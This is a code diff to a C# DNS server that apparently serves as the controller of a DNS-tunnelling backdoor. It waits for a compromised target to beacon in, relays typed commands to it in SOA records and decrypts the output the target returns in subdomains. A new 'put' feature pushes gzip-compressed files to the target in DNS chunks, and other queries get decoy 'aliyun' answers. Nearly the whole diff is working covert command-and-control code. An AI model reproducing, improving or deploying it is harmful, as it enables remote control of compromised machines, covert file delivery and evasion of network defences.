@@ -5,6 +5,8 @@ using System.Text;
 using ARSoft.Tools.Net.Dns;
 using ARSoft.Tools.Net;
 using System.Threading.Tasks;
+using System.IO;
+using System.IO.Compression;
 
 namespace DNSServer
 {
@@ -18,7 +20,16 @@ namespace DNSServer
             dnsServer.QueryReceived += DnsServer_QueryReceived;
             dnsServer.Start();
             while (true)
-            {              
+            {
+                while (true)
+                {
+                    if (Options.live)
+                    {
+                        Console.WriteLine("目标上线");
+                        break;
+                    }
+                    
+                }
                 Console.WriteLine("请输入命令：");
                 Options.command = Console.ReadLine();
                 Options.readline = false;
@@ -44,33 +55,117 @@ namespace DNSServer
 
                     foreach (DnsQuestion dnsQuestion in query.Questions)
                     {
-                        if (Options.command != "header")
+                        string domainName = dnsQuestion.Name.ToString().Remove(dnsQuestion.Name.ToString().Length - 1, 1);
+                        if ((Options.command != "header") && (!Options.command.Contains("put")))
                         {
+                            Options.SN = 0;
                             Options.flag = "true";
                             sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
+                            SoaRecord soaRecordc = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), Options.SN, 0, 4, 4, 4);
+                            query.AnswerRecords.Add(soaRecordc);
+                            Options.flag = "fasle";
+                            Options.command = "header";
                         }
-                        string domainName = dnsQuestion.Name.ToString().Remove(dnsQuestion.Name.ToString().Length - 1,1);
+                        else if (Options.command.Contains("put"))
+                        {
+                            try
+                            {
+                                Options.flag = "true";
+                                Options.SN = 0;
+                                sendDate = Encryption.SplitLength(Encoding.UTF8.GetBytes(Options.command));
+                                Console.WriteLine(Options.command.Split(' ')[1]);
+                                FileStream fileStream = new FileStream(Options.command.Split(' ')[1], FileMode.Open, FileAccess.Read);
+                                byte[] bytes = new byte[fileStream.Length];
+                                fileStream.Read(bytes, 0, bytes.Length);
+                                byte[] gzipBytes = gzipCompress(bytes);
+                                //string fileString = Encryption.ByteArrayToHexString(gzipBytes);
+                                List<string> temp = Encryption.SplitLength(gzipBytes);
+                                //Console.WriteLine(string.Join("", temp));
+                                //Console.WriteLine(temp.Count);
+                                int length = temp.Count() / 3;
+                                int mod = temp.Count() % 3;
+                                for (int i = 0; i < length; i++)
+                                {
+                                    string post = "";
+                                    var l = temp.GetRange(i * 3, 3);
+                                    foreach (string s in l)
+                                    {
+                                        post += s + ".";
+                                    }
+                                    Options.fileDate.Enqueue(post.TrimEnd('.'));
+                                }
+                                if (mod != 0)
+                                {
+                                    string aa = "";
+                                    foreach (string a in temp.GetRange(length * 3, mod))
+                                    {
+                                        aa += a + ".";
+                                    }
+                                    Options.fileDate.Enqueue(aa.TrimEnd('.'));
+                                }
+                                //Console.WriteLine(Options.fileDate.Count);
+                                SoaRecord soaRecordf = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), 0, Options.fileDate.Count, 4, 4, 4);
+                                query.AnswerRecords.Add(soaRecordf);
+                                Options.flag = "false";
+                                Options.command = "header";
+                                sendDate.Clear();
+                            }
+                            catch
+                            {
+                                Console.WriteLine("文件错误");
+                                SoaRecord soaRecordf = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { "dns", "aliyun" }), new DomainName(new string[] { "dns", "aliyun" }), 0, Options.fileDate.Count, 4, 4, 4);
+                                query.AnswerRecords.Add(soaRecordf);
+                                Options.flag = "false";
+                                Options.command = "header";
+                                sendDate.Clear();
+                            }
+                        }
+                        else if (domainName.StartsWith("ftp"))
+                        {
+                            //Console.WriteLine("要发送数据长度：  " + Options.fileDate.Count.ToString());
+                            try
+                            {
+                                SoaRecord soaRecordftp = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(Options.fileDate.Dequeue().Split('.')), 1, 4, Options.key, 4, 4);
+                                query.AnswerRecords.Add(soaRecordftp);
+                                Options.key++;
+                            }
+                            catch (Exception ex)
+                            {
+                                Console.WriteLine(ex.ToString());
+                            }
+                            Options.readline = true;
+                            Options.recDate.Clear();
+                        }
+                        else if (domainName.StartsWith("live"))
+                        {
+                            Options.live = true;
+                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
+                            query.AnswerRecords.Add(soaRecord);
+                        }
+                        else
+                        {
+                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
+                            query.AnswerRecords.Add(soaRecord);
+                        }                        
                         if (domainName.StartsWith("header"))
                         {
+                            SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 4);
+                            query.AnswerRecords.Add(soaRecord);
                             Options.cmd5 = domainName.Split('.')[1];
                             foreach (string subdomain in domainName.Split('.').ToList().GetRange(2, domainName.Split('.').Length - 4))
                             {
                                 Options.recDate.Add(subdomain);
                             }
-                            //Console.WriteLine(domainName.Split('.').ToString().Substring(2, domainName.Split('.').ToString().Length - 2));
+                            if (Options.cmd5 == GetMD5Hash(string.Join("", Options.recDate)))
+                            {
+                                Console.WriteLine(Encoding.UTF8.GetString(Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.recDate)))));
+                                Options.readline = true;
+                                Options.recDate.Clear();
+                            }
                         }
                         //Console.WriteLine("SOA请求");
-                        if (Options.cmd5 == GetMD5Hash(string.Join("", Options.recDate)))
-                        {
-                            Console.WriteLine(Encoding.UTF8.GetString(Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.recDate)))));
-                            Options.readline = true;
-                            Options.recDate.Clear();
-                        }
-                        //Console.WriteLine(Options.cmd5);
-                        SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new string[] { Options.flag }), new DomainName(sendDate.ToArray()), 4, 4, 4, 4, 4);
-                        query.AnswerRecords.Add(soaRecord);
-                        Options.flag = "fasle";
-                        Options.command = "header";
+
+                        Options.SN = 0;
                     }
                 }
             }
@@ -100,6 +195,26 @@ namespace DNSServer
                 throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
             }
 
+        }
+        public static byte[] gzipCompress(byte[] data)
+        {
+            try
+            {
+                MemoryStream ms = new MemoryStream();
+                GZipStream zip = new GZipStream(ms, CompressionMode.Compress, true);
+                zip.Write(data, 0, data.Length);
+                zip.Close();
+                byte[] buffer = new byte[ms.Length];
+                ms.Position = 0;
+                ms.Read(buffer, 0, buffer.Length);
+                ms.Close();
+                return buffer;
+
+            }
+            catch (Exception e)
+            {
+                throw new Exception(e.Message);
+            }
         }
     }
 }
